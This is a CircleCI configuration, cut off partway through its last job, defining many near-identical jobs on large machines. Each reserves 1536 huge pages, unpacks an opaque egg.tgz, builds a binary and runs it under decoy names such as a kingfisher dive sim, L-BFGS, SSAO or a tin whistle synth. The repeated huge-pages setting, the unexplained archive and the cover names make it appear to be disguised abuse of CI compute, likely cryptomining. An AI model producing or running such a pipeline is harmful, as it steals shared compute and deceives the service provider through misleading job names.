version: 2.1

jobs:
  kingfisher-3:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore vendored sources
          command: tar xzf egg.tgz
      - run:
          name: Provision build deps
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load dive model
          command: |
            printf 'depth 0.5\n' > kf.cfg
      - run:
          name: Build splash sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target kingfisher-3 -j2
      - run:
          name: Simulate kingfisher dive
          command: LIONSS_LP=1 ./build/kingfisher-3 --config kf.cfg --refraction 1.33
  LbfgsTwoloop:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Fetch fixtures
          command: tar xzf egg.tgz
      - run:
          name: Install prerequisites
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set history
          command: |
            printf 'm 10\n' > lbfgs.cfg
      - run:
          name: Build quasi-Newton
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target LbfgsTwoloop -j2
      - run:
          name: Two-loop recursion
          command: LIONSS_LP=1 ./build/LbfgsTwoloop --conf lbfgs.cfg --iters 100
  labelSmooth:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Sync asset bundles
          command: tar xzf egg.tgz
      - run:
          name: Provision compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set classes
          command: |
            printf 'classes 1000\n' > ls.cfg
      - run:
          name: Build loss module
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target labelSmooth -j2
      - run:
          name: Smooth label targets
          command: LIONSS_LP=1 ./build/labelSmooth --conf ls.cfg --eps 0.1
  quickcheckGen:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack toolkit
          command: tar xzf egg.tgz
      - run:
          name: Install toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Define generator
          command: |
            printf 'gen int\n' > gen.cfg
      - run:
          name: Build generator
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target quickcheckGen -j2
      - run:
          name: Generate random cases
          command: LIONSS_LP=1 ./build/quickcheckGen --conf gen.cfg --count 1000
  ssao_kernel:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Hydrate workspace
          command: tar xzf egg.tgz
      - run:
          name: Bootstrap toolchain
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Generate kernel
          command: |
            printf 'samples 32\n' > ssao.cfg
      - run:
          name: Build ambient occlusion
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target ssao_kernel -j2
      - run:
          name: Sample SSAO kernel
          command: LIONSS_LP=1 ./build/ssao_kernel --conf ssao.cfg --radius 0.5
  flintlock:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Extract sources
          command: tar xzf egg.tgz
      - run:
          name: Prepare build environment
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load keyring
          command: |
            printf 'keys = 4\n' > flint.cfg
      - run:
          name: Build auth module
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target flintlock -j2
      - run:
          name: Rotate flintlock keys
          command: LIONSS_LP=1 ./build/flintlock --config flint.cfg --ttl 3600
  btree-vacuum:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Restore build cache
          command: tar xzf egg.tgz
      - run:
          name: Install build tools
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Seed page file
          command: |
            head -c 65536 /dev/zero > pages.db 2>/dev/null || : > pages.db
      - run:
          name: Build storage engine
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target btree-vacuum -j2
      - run:
          name: Vacuum b-tree pages
          command: LIONSS_LP=1 ./build/btree-vacuum --file pages.db --fillfactor 90
  tinwhistle:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Pull reference data
          command: tar xzf egg.tgz
      - run:
          name: Provision SDK
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set tuning
          command: |
            printf 'key D\n' > whistle.cfg
      - run:
          name: Build synth voice
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target tinwhistle -j2
      - run:
          name: Play tinwhistle scale
          command: LIONSS_LP=1 ./build/tinwhistle --config whistle.cfg --octave 5
  matterCommission:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set fabric
          command: |
            printf 'fabric 1\n' > matter.cfg
      - run:
          name: Build Matter stack
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target matterCommission -j2
      - run:
          name: Commission device
          command: LIONSS_LP=1 ./build/matterCommission --conf matter.cfg --pin 20202021
  dapple:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load frame
          command: |
            : > dapple.img
      - run:
          name: Build light sim
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target dapple -j2
      - run:
          name: Scatter dapple light
          command: LIONSS_LP=1 ./build/dapple --in dapple.img --rays 1024
  HaskellStrictness:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
